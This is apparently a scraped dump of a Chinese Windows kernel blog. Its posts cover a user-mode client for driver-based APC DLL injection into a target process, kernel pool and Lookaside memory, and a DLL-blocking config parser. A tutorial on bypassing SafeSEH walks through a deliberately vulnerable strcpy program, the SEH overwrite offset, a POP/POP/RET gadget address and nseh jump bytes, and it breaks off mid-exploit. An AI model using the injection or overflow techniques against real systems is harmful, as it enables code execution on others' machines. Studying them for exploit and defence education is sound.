12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#define DEVICE_LINK_NAME L&quot;\\\\??\\\\APCInjectionLinkName&quot;#define CTL_APC_INJECTION \\ CTL_CODE(FILE_DEVICE_UNKNOWN,0x830,METHOD_BUFFERED,FILE_ANY_ACCESS)typedef struct _INJECTION_INFORMATION_&#123; wchar_t DllFullPath[MAX_PATH];// 当前DLL完整路径 ULONG TargetProcessID;// 目标进程ID UCHAR IsUnlinkModule; // 是否卸载模块&#125;INJECTION_INFORMATION, *PINJECTION_INFORMATION;VOID ApcInjection()&#123; NTSTATUS Status; ULONG TargetProcessID = 0; cin &gt;&gt; TargetProcessID;// 输入进程ID const wchar_t* DllName = L&quot;Dll.dll&quot;; wstring DllFullPath; // 获取当前可执行文件的路径，并将DllName与路径拼接起来，得到完整的DLL路径 DllFullPath = GetExeDirectory() + L&quot;\\\\&quot; + DllName; //选择编译 CControlDevice Object; // 打开设备对象 if (!Object.SeOpenDeviceObject(DEVICE_LINK_NAME)) &#123; return; &#125; INJECTION_INFORMATION InjectionInfo = &#123; 0 &#125;; InjectionInfo.TargetProcessID = TargetProcessID; InjectionInfo.IsUnlinkModule = TRUE; wcscpy_s(InjectionInfo.DllFullPath, DllFullPath.c_str()); // 发送INJECTION_INFORMATION结构体和控制码 Status = Object.SeDeviceIoControl(&amp;InjectionInfo,sizeof(INJECTION_INFORMATION),CTL_APC_INJECTION); if (!NT_SUCCESS(Status)) &#123; std::cout &lt;&lt; &quot;CTL_APC_INJECTION Error\\r\\n&quot;; &#125; else &#123; std::cout &lt;&lt; &quot;CTL_APC_INJECTION Succeeded\\r\\n&quot;; &#125; printf(&quot;Input AnyKey To Exit\\r\\n&quot;); getchar(); getchar();&#125; Ring3操作驱动方法类12345678910class CControlDevice&#123;public: CControlDevice(); ~CControlDevice(); BOOL CControlDevice::SeOpenDeviceObject(WCHAR* DeviceLinkName); NTSTATUS CControlDevice::SeDeviceIoControl(PVOID BufferData, ULONG BufferLength, ULONG IoControlCode);private: HANDLE m_DeviceObject = INVALID_HANDLE_VALUE;&#125;; 获取Exe的完整名字获取当前第一模块（可执行文件）路径，在路径中去掉文件名，再做一些转换 1234567wstring GetExeDirectory()&#123; wchar_t BufferData[MAX_PATH] = &#123; 0 &#125;; DWORD BufferLength = ARRAYSIZE(BufferData); GetModuleFileNameW(NULL, BufferData, BufferLength); return GetParentDirectory(BufferData);&#125; 1234567891011121314wstring GetParentDirectory(const std::wstring&amp; BufferData)&#123; if (BufferData.empty()) return BufferData; auto v1 = BufferData.rfind(L&#x27;\\\\&#x27;); if (v1 == BufferData.npos) v1 = BufferData.rfind(L&#x27;/&#x27;); if (v1 != BufferData.npos) return BufferData.substr(0, v1); else return BufferData;&#125; 打开设备对象通过链接对象获取驱动设备对象 1234567891011121314151617BOOL CControlDevice::SeOpenDeviceObject(WCHAR* DeviceLinkName)&#123; //通过LinkName 获得驱动设备对象 if (m_DeviceObject != INVALID_HANDLE_VALUE) return TRUE; // Try to open handle to existing driver m_DeviceObject = CreateFileW( DeviceLinkName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); if (m_DeviceObject != INVALID_HANDLE_VALUE) return TRUE; return FALSE;&#125; 发送IO控制码最重要的DeviceIoControl 12345678910111213NTSTATUS CControlDevice::SeDeviceIoControl(PVOID BufferData,ULONG BufferLength,ULONG IoControlCode)&#123; DWORD ReturnLength = 0; if (m_DeviceObject == INVALID_HANDLE_VALUE) return STATUS_DEVICE_DOES_NOT_EXIST; if (!DeviceIoControl(m_DeviceObject, IoControlCode, BufferData, BufferLength, NULL, 0, &amp;ReturnLength, NULL)) return STATUS_UNSUCCESSFUL; return STATUS_SUCCESS;&#125; 32位区别基本仅在ShellCode只有32位一种。","categories":[{"name":"Windows Kernel","slug":"Windows-Kernel","permalink":"https://qianmuoy.github.io/categories/Windows-Kernel/"}],"tags":[]},{"title":"使用内核内存","slug":"使用内核内存","date":"2024-03-09T12:39:58.000Z","updated":"2024-03-09T12:40:11.080Z","comments":true,"path":"2024/03/09/使用内核内存/","link":"","permalink":"https://qianmuoy.github.io/2024/03/09/%E4%BD%BF%E7%94%A8%E5%86%85%E6%A0%B8%E5%86%85%E5%AD%98/","excerpt":"","text":"使用内核内存wdm给出的使用内存池方法 申请内存 123456789PVOID AllocateBuffer(ULONG ViewSize)&#123; PVOID VirtualAddress = ExAllocatePool(NonPagedPool, ViewSize); if (VirtualAddress != NULL) &#123; RtlZeroMemory(VirtualAddress, ViewSize); &#125; return VirtualAddress;&#125; 释放内存 1234VOID FreeBuffer(PVOID VirtualAddress)&#123; ExFreePool(VirtualAddress);&#125; new 和delete 关键字在驱动里面是不可以使用，通过重载的方式即可在内核中使用，并通过c++编译器来编译。使用面向对象时，DriverEntry系列函数需要extern “C” 内部重载 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;ntddk.h&gt; class Myclass&#123;public: Myclass() &#123; KdPrint((&quot;构造函数\\n&quot;)); &#125; ~Myclass() &#123; KdPrint((&quot;析构函数\\n&quot;)); &#125; void * _cdecl operator new (size_t size,POOL_TYPE poolType= PagedPool) &#123; KdPrint((&quot;进入new\\n&quot;)); return ExAllocatePoolWithTag(poolType,size,&#x27;a&#x27;); &#125;; void _cdecl operator delete(void *p) &#123; KdPrint((&quot;进入delete\\n&quot;)); if (p!=NULL) &#123; ExFreePoolWithTag(p, &#x27;a&#x27;); &#125; &#125;;&#125;;VOID Unload(IN PDRIVER_OBJECT pDriverObject)&#123; //驱动卸载的时候显示 KdPrint((&quot;Goodbye driver\\n&quot;));&#125;extern &quot;C&quot; NTSTATUS DriverEntry( IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)&#123; DriverObject-&gt;DriverUnload = Unload; Myclass *pMyclass = new Myclass(); delete pMyclass; return STATUS_SUCCESS;&#125; 全局重载 一个实例，可以直接套用Windows内核驱动中使用new和delete - PNPON内核开发 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#pragma code_seg(&quot;PAGE&quot;)//// New and delete operators//_When_((PoolType &amp; NonPagedPoolMustSucceed) != 0, __drv_reportError(&quot;Must succeed pool allocations are forbidden. &quot; &quot;Allocation failures cause a system crash&quot;))void* __cdecl operator new(size_t Size, POOL_TYPE PoolType)&#123; PAGED_CODE(); Size = (Size != 0) ? Size : 1; void* pObject = ExAllocatePoolWithTag(PoolType, Size, BDDTAG);#if DBG if (pObject != NULL) &#123; RtlFillMemory(pObject, Size, 0xCD); &#125;#endif // DBG return pObject;&#125;_When_((PoolType &amp; NonPagedPoolMustSucceed) != 0, __drv_reportError(&quot;Must succeed pool allocations are forbidden. &quot; &quot;Allocation failures cause a system crash&quot;))void* __cdecl operator new[](size_t Size, POOL_TYPE PoolType)&#123; PAGED_CODE(); Size = (Size != 0) ? Size : 1; void* pObject = ExAllocatePoolWithTag(PoolType, Size, BDDTAG);#if DBG if (pObject != NULL) &#123; RtlFillMemory(pObject, Size, 0xCD); &#125;#endif // DBG return pObject;&#125;void __cdecl operator delete(void* pObject)&#123; PAGED_CODE(); if (pObject != NULL) &#123; ExFreePool(pObject); &#125;&#125;void __cdecl operator delete[](void* pObject)&#123; PAGED_CODE(); if (pObject != NULL) &#123; ExFreePool(pObject); &#125;&#125; 从代码来看，new和delete运算符的重载依然是对ExAllocatePoolWithTag和ExFreePool函数的封装。 这里说明一下，在dbg模式下，将分配的内存全部置为0xcd,这和应用层在调试模式下堆的内存初始化一样的道理。 0xcd其实这里是int指令的指令，再配合一个cd,就变成了int cd,说明直接行的是中断0xcd,这样CPU执行到此处就会出现中断异常。这和栈上的0xcc,int3的原理一致。 简单版。同样的，这种重载对于类也有效。 123456789101112131415161718192021222324void* __cdecl operator new(size_t size)&#123; return ExAllocatePoolWithTag(NonPagedPool, size, &#x27;yTag&#x27;);&#125;void __cdecl operator delete(void* p,size_t a)&#123; ExFreePool(p);&#125;void* __cdecl operator new[](size_t size)&#123; return ExAllocatePoolWithTag(NonPagedPool, size, &#x27;yTag&#x27;);&#125;void __cdecl operator delete[](void* p)&#123; ExFreePool(p);&#125;class CBase&#123;public: int a;&#125;; CBase* p = (CBase*)new CBase(); //operator new(size_t size) p-&gt;a = 10; delete p; //void __cdecl operator delete(void* p,size_t a)","categories":[{"name":"Windows Kernel","slug":"Windows-Kernel","permalink":"https://qianmuoy.github.io/categories/Windows-Kernel/"}],"tags":[]},{"title":"使用Lookaside内存","slug":"使用Lookaside内存","date":"2024-03-09T12:39:17.000Z","updated":"2024-03-09T12:39:37.065Z","comments":true,"path":"2024/03/09/使用Lookaside内存/","link":"","permalink":"https://qianmuoy.github.io/2024/03/09/%E4%BD%BF%E7%94%A8Lookaside%E5%86%85%E5%AD%98/","excerpt":"","text":"使用Lookaside内存频繁申请和回收内存，会导致在内存上产生大量的内存“空洞”，从 而导致最终无法申请内存。DDK为程序员提供了Lookaside结构来解决这个问题。 频繁地申请内存，会导致一个问题，就是在内存中产生“空洞”。图 5-11显示了这种情况，在内存中先后申请三块内存。最开始可用的内 存是连续的。当某个时刻内存块2被回收以后，如果系统想分配一块略 微大于原先内存块2的内存，这时候原先的内存2就不能被申请成功。 因此，频繁地申请、回收内存会导致在内存上产生大量的内存“空洞”。 如果系统中存在大量的内存“空洞”，即使内存中有大量的可用内 存，也会导致申请内存失败。在操作系统空闲的时候，系统会整理内 存中的“空洞”，将内存中的“空洞”进行合并。 如果驱动程序需要频繁地从内存中申请、回收固定大小的内存，DDK提 供了一种机制来解决这个问题，这就是使用Lookaside对象。 可以将Lookaside对象想象成一个内存容器。在初始的时候，它先向 Windows申请了一块比较大的内存。以后程序员每次申请内存的时候， 不是直接向Windows申请内存，而是向Lookaside对象申请内存。 Lookaside对象会智能地避免产生内存“空洞”。如果Lookaside对象 内部的内存不够用时，它会向操作系统申请更多的内存。当Lookaside 对象内部有大量的未使用的内存时，它会自动让Windows回收一部分内存。总之，Lookaside是一个自动的内存分配容器。通过对Lookaside 对象申请内存，效率要高于直接向Windows申请内存。Lookaside一般 会在以下情况使用： （1）程序员每次申请固定大小的内存。 （2）申请和回收的操作十分频繁。 如果程序员遇到上述两种情况，可以考虑使用Lookaside对象。驱动程序中的运行效率是程序员必须考虑的问题。 使用Lookaside内存的方法 初始化Lookaside结构 123456789101112131415161718192021_IRQL_requires_max_(DISPATCH_LEVEL)NTKERNELAPIVOIDExInitializeNPagedLookasideList ( _Out_ PNPAGED_LOOKASIDE_LIST Lookaside, _In_opt_ PALLOCATE_FUNCTION Allocate, _In_opt_ PFREE_FUNCTION Free, _In_ ULONG Flags, _In_ SIZE_T Size, _In_ ULONG Tag, _In_ USHORT Depth );void InitializeLookAsideList()&#123; if (__IsLookAsideList == FALSE) &#123; ExInitializeNPagedLookasideList(&amp;__LookAsideList, NULL, NULL, 0, BUFFER_SIZE_MAX, &#x27;XXXX&#x27;, 0); __IsLookAsideList = TRUE; &#125;&#125; 向LookAside申请内存 1234567891011121314151617181920PVOID AllocateBufferFromLookAsideList()&#123; KIRQL CurrentIrql; PVOID VirtualAddress = NULL; if (__IsLookAsideList == FALSE) return NULL; CurrentIrql = KeGetCurrentIrql(); if (CurrentIrql &gt; DISPATCH_LEVEL) return NULL; VirtualAddress = ExAllocateFromNPagedLookasideList(&amp;__LookAsideList); if (VirtualAddress != NULL) &#123; RtlZeroMemory(VirtualAddress, BUFFER_SIZE_MAX); &#125; return VirtualAddress;&#125; 从Lookaside中释放内存 1234567891011121314151617void FreeBufferToLookAsideList( PVOID VirtualAddress)&#123; KIRQL CurrentIrql; if (__IsLookAsideList == FALSE) return; if (VirtualAddress == NULL) return; CurrentIrql = KeGetCurrentIrql(); if (CurrentIrql &gt; DISPATCH_LEVEL) return; ExFreeToNPagedLookasideList(&amp;__LookAsideList, VirtualAddress);&#125; 释放Lookaside结构 12345678void UninitializeLookAsideList()&#123; if (__IsLookAsideList == TRUE) &#123; ExDeleteNPagedLookasideList(&amp;__LookAsideList); __IsLookAsideList = FALSE; &#125;&#125;","categories":[{"name":"Windows Kernel","slug":"Windows-Kernel","permalink":"https://qianmuoy.github.io/categories/Windows-Kernel/"}],"tags":[]},{"title":"内核解析拦截DLL设置","slug":"内核解析拦截DLL设置","date":"2024-03-09T12:38:13.000Z","updated":"2024-03-09T12:38:43.779Z","comments":true,"path":"2024/03/09/内核解析拦截DLL设置/","link":"","permalink":"https://qianmuoy.github.io/2024/03/09/%E5%86%85%E6%A0%B8%E8%A7%A3%E6%9E%90%E6%8B%A6%E6%88%AADLL%E8%AE%BE%E7%BD%AE/","excerpt":"","text":"内核拦截DLL123456789FAST_MUTEX __AntiLoadDllLock;PANTI_LOAD_DLL __AntiLoadDll = NULL;VOIDInitializeAntiLoadDll()&#123; ExInitializeFastMutex(&amp;__AntiLoadDllLock); BootReadFile();&#125; 处理文件信息首先获取当前工作目录，然后将其与文件名 XXXX.ini 拼接起来，得到文件的路径。接着，使用 Windows API 函数 ZwCreateFile 打开文件，使用 ZwQueryInformationFile 获取文件长度，使用 ExAllocatePool 分配内存缓冲区，再使用 ZwReadFile 读取文件内容。最后，它调用 ParseAntiLoadFile 解析文件内容 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138BOOLEANBootReadFile()&#123; NTSTATUS Status = STATUS_UNSUCCESSFUL; UNICODE_STRING v1 = &#123; 0 &#125;; HANDLE FileHandle = NULL; OBJECT_ATTRIBUTES ObjectAttributes = &#123; 0 &#125;; IO_STATUS_BLOCK IoStatusBlock = &#123; 0 &#125;; FILE_STANDARD_INFORMATION FileStandardInfo = &#123; 0 &#125;; LARGE_INTEGER FileLength = &#123; 0 &#125;; LARGE_INTEGER ByteOffset = &#123; 0 &#125;; PVOID VirtualAddress = NULL; WCHAR* v5 = NULL; BOOLEAN IsOk = FALSE; if (!__WorkPath.Length) &#123; // 驱动路径 return FALSE; &#125; v5 = (PWCHAR)AllocateBuffer(MAX_BYTE); if (v5 == NULL) &#123; return FALSE; &#125; // 拼接出ini路径 Status = AppendWorkPath( v5, MAX_PATH, FILE_NAME, WCHAR_COUNT_BY_ARRAY(FILE_NAME) ); if (Status != STATUS_SUCCESS) &#123; goto Exit; &#125; // 最终v5形如&quot;\\??\\C:\\911kisknl64\\XXXX.ini&quot; //双字转换为Unicode RtlInitUnicodeString( &amp;v1, v5); // 初始化OA InitializeObjectAttributes( &amp;ObjectAttributes, &amp;v1, OBJ_CASE_INSENSITIVE, NULL, NULL ); //打开文件 Status = ZwCreateFile( &amp;FileHandle, GENERIC_READ | SYNCHRONIZE | FILE_READ_ATTRIBUTES, &amp;ObjectAttributes, &amp;IoStatusBlock, NULL, 0, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN, FILE_RANDOM_ACCESS | FILE_COMPLETE_IF_OPLOCKED | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0 ); if (!NT_SUCCESS(Status)) &#123; goto Exit; &#125; //计算文件长度 Status = ZwQueryInformationFile( FileHandle, &amp;IoStatusBlock, &amp;FileStandardInfo, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation ); if (!NT_SUCCESS(Status)) &#123; goto Exit; &#125; FileLength = FileStandardInfo.EndOfFile; if (FileLength.QuadPart &gt; 50 * 1024) &#123; goto Exit; &#125; // 申请一个非分页内存 VirtualAddress = ExAllocatePool( NonPagedPool, (ULONG)FileLength.LowPart + 1); if (NULL == VirtualAddress) &#123; goto Exit; &#125; RtlZeroMemory(VirtualAddress, (ULONG)FileLength.LowPart + 1); Status = ZwReadFile( FileHandle, NULL, NULL, NULL, &amp;IoStatusBlock, VirtualAddress, (ULONG)FileLength.LowPart, &amp;ByteOffset, //真正读取了多少 NULL ); if (!NT_SUCCESS(Status)) &#123; goto Exit; &#125; // 读出文件内容，转交ParseAntiLoadFile函数处理 IsOk = ParseAntiLoadFile((LPSTR)VirtualAddress);Exit: FreeBuffer(v5); v5 = NULL; if (VirtualAddress != NULL) &#123; ExFreePool(VirtualAddress); VirtualAddress = NULL; &#125; if (NULL != FileHandle) &#123; ZwClose(FileHandle); FileHandle = NULL; &#125; return IsOk;&#125; 拼接文件路径将GLOBAL_LINK、__WorkPath.Buffer和Name三者拼接成一个完整的路径，存储在Path变量中，并返回操作的执行状态 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950NTSTATUS AppendWorkPath( WCHAR* Path, ULONG PathLength, WCHAR* Name, ULONG NameLength)&#123; NTSTATUS Status = STATUS_UNSUCCESSFUL; ExAcquireFastMutex(&amp;__WorkPathLock); if (__WorkPath.Buffer == NULL) &#123; ExReleaseFastMutex(&amp;__WorkPathLock); return Status; &#125; do &#123; // 将GLOBAL_LINK复制到Path中 Status = RtlStringCchCopyW(Path, PathLength, GLOBAL_LINK); Path += WCHAR_COUNT_BY_ARRAY(GLOBAL_LINK); if (!NT_SUCCESS(Status)) break; // 限制大小 将__WorkPath.Buffer拷贝到Path中 Status = RtlStringCchCopyNW(Path, PathLength, __WorkPath.Buffer, __WorkPath.Length / sizeof(WCHAR)); // 更新path指针位置 Path += __WorkPath.Length / sizeof(WCHAR); if (!NT_SUCCESS(Status)) break; // 检查__WorkPath.Buffer末尾是否是&#x27;\\\\&#x27; if (__WorkPath.Buffer[__WorkPath.Length / sizeof(WCHAR) - 1] != L&#x27;\\\\&#x27;) &#123; // 没有，加上 Status = RtlStringCchCopyNW(Path, PathLength, L&quot;\\\\&quot;, 1); Path++; if (!NT_SUCCESS(Status)) break; &#125; // 将name变量内容也拷贝到Path中 Status = RtlStringCchCopyNW(Path, PathLength, Name, NameLength); if (!NT_SUCCESS(Status)) break; Status = STATUS_SUCCESS; &#125; while (FALSE); ExReleaseFastMutex(&amp;__WorkPathLock); return Status;&#125; xxxx.ini12[AntiLoadDll]Count=2;1=1111;2=2222; 解析对抗DLL加载123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210#define FILE_NAME L&quot;XXXX.ini&quot;#define KEY_NAME &quot;[AntiLoadDll]&quot;#define SUB_KEY_COUNT_NAME &quot;Count=&quot;#define SEPARATE_NAME &quot;;&quot;typedef struct _ANTI_LOAD_DLL_ENTRY&#123; ULONG PathHash;&#125;ANTI_LOAD_DLL_ENTRY, *PANTI_LOAD_DLL_ENTRY;typedef struct _ANTI_LOAD_DLL_&#123; int Count; ANTI_LOAD_DLL_ENTRY Entry[1];&#125;ANTI_LOAD_DLL, * PANTI_LOAD_DLL;BOOLEANParseAntiLoadFile( __in PSTR VirtualAddress)&#123; BOOLEAN IsOk = FALSE; PSTR v1 = NULL; PSTR v2 = NULL; CHAR Key[32] = &#123; 0 &#125;; CHAR KeyValue[MAX_PATH] = &#123; 0 &#125;; INT Count = 0; ULONG ViewSize = 0; INT i = 0; ULONG PathHash = 0; // 字符串的Hash值表达 ANSI_STRING v3; UNICODE_STRING v4; NTSTATUS Status = STATUS_UNSUCCESSFUL; if (VirtualAddress == NULL) &#123; return IsOk; &#125; ExAcquireFastMutex(&amp;__AntiLoadDllLock); do &#123; // 从VirtualAddress查找第一次出现KEY_NAME的位置，返回到v1 // 检查文件头 v1 = strstr(VirtualAddress, KEY_NAME); if (v1 == NULL) &#123; break; &#125; // 找到文件开始位置 v1 = strstr(v1, SUB_KEY_COUNT_NAME); if (v1 == NULL) &#123; break; &#125; // 移动指针到内容 v1 += strlen(SUB_KEY_COUNT_NAME); if (v1 == NULL) &#123; break; &#125; // 指针v2指向第一个分号 v2 = strstr(v1, SEPARATE_NAME); if (v2 == NULL) &#123; break; &#125; RtlZeroMemory(Key, sizeof(Key)); RtlZeroMemory(KeyValue, sizeof(KeyValue)); // 按照规则创建一个格式化的字符串 %d Status = RtlStringCchPrintfA( Key, 32, &quot;%d&quot;, DLL_MAX_COUNT ); if (!NT_SUCCESS(Status)) &#123; break; &#125; //Count = 100,120 if ((v2 &lt;= v1) || (v2 - v1 &gt; (int)strlen(Key))) &#123; // 指针位置不对 break; &#125; // 将v1、v2之间的内容拷贝到KeyValue中，转换成UnicodeString RtlCopyMemory(KeyValue, v1, v2 - v1); RtlInitAnsiString(&amp;v3, KeyValue); Status = RtlAnsiStringToUnicodeString( &amp;v4, &amp;v3, TRUE //动态申请内存 ); //单字转换成双字 if (!NT_SUCCESS(Status)) &#123; break; &#125; //转换成Int Status = RtlUnicodeStringToInteger( &amp;v4, 0, (PULONG)&amp;Count ); // Count中是dll的总数 RtlFreeUnicodeString(&amp;v4); if (!NT_SUCCESS(Status)) &#123; break; &#125; if ((Count &lt; 0) || (Count &gt; DLL_MAX_COUNT)) &#123; break; &#125; // 先释放之前的结构 if (__AntiLoadDll != NULL) //二维指针 [int]【】【】【】【】【】【】 &#123; FreeBuffer((PVOID)__AntiLoadDll); __AntiLoadDll = NULL; &#125; ViewSize = Count * sizeof(ANTI_LOAD_DLL_ENTRY) + sizeof(int); __AntiLoadDll = (PANTI_LOAD_DLL)AllocateBuffer(ViewSize); if (__AntiLoadDll == NULL) &#123; break; &#125; RtlZeroMemory(__AntiLoadDll, ViewSize); __AntiLoadDll-&gt;Count = Count; for (i = 0; i &lt; Count; i++) &#123; // 遍历所有数量 RtlZeroMemory(Key, sizeof(Key)); // key变为“i=”格式 Status = RtlStringCchPrintfA( Key, 32, &quot;%d=&quot;, i + 1 ); //Key[32] &quot;1=&quot; if (!NT_SUCCESS(Status)) &#123; break; &#125; //Count=100, 1= 查找位置 v2 = strstr(v1, Key); if (v2 == NULL) &#123; break; &#125; // 移动指针，查找分号位置 v1 = v2; v2 = strstr(v1, SEPARATE_NAME); if (v2 == NULL) &#123; break; &#125; // 移动指针过key v1 += strlen(Key); // 验证指针不超过; if ((v2 &lt;= v1) || (v2 - v1 &gt;= DLL_HASH_COUNT)) &#123; break; &#125; // 取出等号后的KeyValue RtlZeroMemory(KeyValue, sizeof(KeyValue)); RtlCopyMemory(KeyValue, v1, v2 - v1); RtlInitAnsiString(&amp;v3, KeyValue); Status = RtlAnsiStringToUnicodeString( &amp;v4, &amp;v3, TRUE ); if (!NT_SUCCESS(Status)) &#123; break; &#125; // KeyValue即是文件hash，取到结构中 PathHash = 0; Status = RtlUnicodeStringToInteger( &amp;v4, 0, &amp;PathHash ); RtlFreeUnicodeString(&amp;v4); if (!NT_SUCCESS(Status) || (PathHash &lt;= 0)) &#123; break; &#125; __AntiLoadDll-&gt;Entry[i].PathHash = PathHash; &#125; IsOk = TRUE; &#125; while (FALSE); ExReleaseFastMutex(&amp;__AntiLoadDllLock); return IsOk;&#125;","categories":[{"name":"Windows Kernel","slug":"Windows-Kernel","permalink":"https://qianmuoy.github.io/categories/Windows-Kernel/"}],"tags":[]},{"title":"突破SafeSEH","slug":"突破SafeSEH","date":"2024-03-09T12:37:05.000Z","updated":"2024-03-09T12:37:46.317Z","comments":true,"path":"2024/03/09/突破SafeSEH/","link":"","permalink":"https://qianmuoy.github.io/2024/03/09/%E7%AA%81%E7%A0%B4SafeSEH/","excerpt":"","text":"突破safeSeh设计SafeSEH保护机制的目的，以为了防止那种攻击者通过覆盖堆栈上的异常处理函数句柄，从而控制程序执行流程的攻击。自Windwos XP SP2之后，微软就已经引入了SafeSEH技术。不过由于SafeSEH需要编译器在编译PE文件时进行特殊支持才能发挥作用，而xp sp2下的系统文件基本都是不支持SafeSEH的编译器编译的，因此在xpsp2下，SafeSEH还没有发挥作用（VS2003及更高版本的编译器中已经开始支持）。从Vista开始，由于系统PE文件基本都是由支持SafeSEH的编译器编译的，因此从Vista开始，SafeSEH开始发挥他强大的作用，对于以前那种简单的通过覆盖异常处理句柄的漏洞利用技术，也就基本失效了。 SafeSEH的基本原理很简单，即在调用异常处理函数之前，对要调用的异常处理函数进行一系列的有效性校验，如果发现异常处理函数不可靠（被覆盖了，被篡改了），立即终止异常处理函数的调用 对于目前的大部分windows操作系统，其系统模块都受SafeSEH保护，可以选用未开启SafeSEH保护的模块来利用，比如漏洞软件本身自带的dll文件，这个可以借助OD插件SafeSEH来查看进程中各模块是否开启SafeSEH保护。如图 由上图可以看到test1.exe未受到SafeSeh保护。 在Exploit 中不利用 SEH（而是通过覆盖返回地址的方法来利用，前提是模块没有GS保护） 如果程序编译的时候没有启用 safeseh 并且至少存在一个没启用 safeseh 的加载模块（系统模块或程序 私有模块）。这样就可以用这些模块中的 pop&#x2F;pop&#x2F;ret 指令地址来绕过保护。test1.exe程序没有启用SafeSeh，所以我们仍然可以利用这两个模块的指令地址绕过SafeSeh。 如果只有应用程序没有启用 safeseh 保护机制，在特定条件下，你依然可以成功利用，应用程序被加载 的地址有 NULL 字节，如果在程序中找到了 pop&#x2F;pop&#x2F;ret 指令，你可以使用这个地址（NULL 字节会是最后 一个字节），但是你不能把 shellcode 放在异常处理器之后（因为这样 shellcode 将不会被拷贝到内存中 – NULL 是字符串终止符） 实战当只有应用程序本身没有开启SafeSeh时如何绕过SafeSeh技术 原理：如果只有应用程序没有启用 safeseh 保护机制，在特定条件下，你依然可以成功利用，尽管应用程序被加载的地址有 NULL 字节【应用程序加载的地址一般是0x00开头】，但如果在程序中找到了 pop&#x2F;pop&#x2F;ret 指令，你可以使用这个地址覆盖SE Handler（NULL 字节会是最后 一个字节）。我们可以把shellcode放到Pointer to next SEH record的前面，在Pointer to next SEH record加一个跳到shellcode的跳转，所以我们可以直接忽视0x00截断问题。 当所有系统的模块都开启了SafeSeh，而我们又不得不利用SafeSeh时，我们希望程序本身没有没有SafeSeh，幸运的是，这种情况非常常见。为了方便演示这种技术，使用下面的代码： 关闭DEP，SafeSeh选项 1234567891011121314151617181920212223242526272829#include &quot;stdafx.h&quot; #include &quot;windows.h&quot; int test(char *str) &#123; char buffer[256]; strcpy(buffer,str); return 0; &#125; int main() &#123; char temp[2048]; test(&quot;AAAA&quot;); return 0; &#125; 下面计算多少字符能够覆盖到默认SEH 。用Immunity Debugger产生10000个随机字符序列： 找到这个pattern.txt，用这个10000个字符替换test(“AAAA”); 中AAAA。然后重新编译。 用Windbg载入，执行两次 g，然后 !exchain。如图 !exchain查询异常信息，可以看到，nseh【注：下文提到的nseh为Pointer to next SEH record，n是next的意思。Nseh是指向下一个异常处理结构的指针，seh是异常处理函数的指针。】已经被覆盖为0x62443961(bD9a)，回到Immunity Debugger，执行!mona po bD9a。 2368字节可以覆盖到nseh。我们可以验证一下，改为test(“AAAAAAAAAAAAAAAAA……”); 里面是2368个A。重新编译，用Immunity Debugger载入，直接运行 刚好能覆盖到nseh。下面就是在应用程序的模块找pop pop retn序列地址。我们不能在系统dll模块找，因为它们有SafeSeh保护，将导致我们的shellcode执行失败。 我用Immunity Debugger的搜索功能 r32是模糊匹配32位寄存器。 为什么要找这样一个地址？为什么POP&#x2F;POP&#x2F;RET是必需的_pop ret-CSDN博客 https://dkalemis.wordpress.com/2010/10/27/the-need-for-a-pop-pop-ret-instruction-sequence/ 幸运的是pop pop retn这种指令很多，很快，在0x00401231找到了一个 00401231 . 59 POP ECX 00401232 . 59 POP ECX 00401233 . C3 RETN 下面就是构造溢出字符串： buf + nseh + Nseh + nops + shellcode,其中Next SEH：放置Shellcode地址 SEH handle：放置“POP POP RET”操作函数的地址 pop pop retn指令地址0x00401231有截断字符\\00。会导致后面的shellcode被截断。我们得想办法解决：那么把shellcode放前面，在seh后面加一个跳转跳到我们的shellcode？你也许觉得可以。其实，这不行，因为seh后面都被截断了，无法在seh后面放跳转指令跳到shellcode。但是，注意到程序在执行pop pop retn后会跟踪执行nseh指令，而nseh在seh前面，不会被截断。因此我们可以在nseh跳到shellcode。把shellcode布置到nseh前面的buf中。由前面我们知道，2368个字符可以覆盖到nseh，我们在其中放置shellcode，不足的用\\x90填充。我看了下我们shellcode长度是194字节，所以我们可以把shellcode布置在nseh前的194字节处，shellcode前面用\\x90填充。那么nseh这里应该是跳到前面的shellcode的指令 我们可以用Immunity Debugger。转到nseh所在地址0x0018FF78。按空格键，在这一行反汇编：jmp 0x0018FEB8 (shellcode地址) 然而我发现这不行，我们nseh只能放四个字节长的指令，jmp 0x0018FEB8指令五字节。但我们还有解决的办法：把shellcode在往上移动八个字节，在nseh前面就空出了八个字节，在这里放置跳转到shellcode的地址，nseh放置跳转到那八个字节。继续，shellcode往上移动八个字节就到了0x0018FEB0处，nseh跳到它前面的把个字节0x0018FF70处。 所以nseh应该放置0x9090F6EB，用同样的办法 Nseh前面的八个字节应该放0x909090FFFFFF39E9。构造的Exploit如下： 12345678910111213141516171819202122232425262728 #include &quot;stdafx.h&quot; #include &quot;windows.h&quot; int test(char *str) &#123; char buffer[256]; strcpy(buffer,str); return 0; &#125; int main() &#123; char 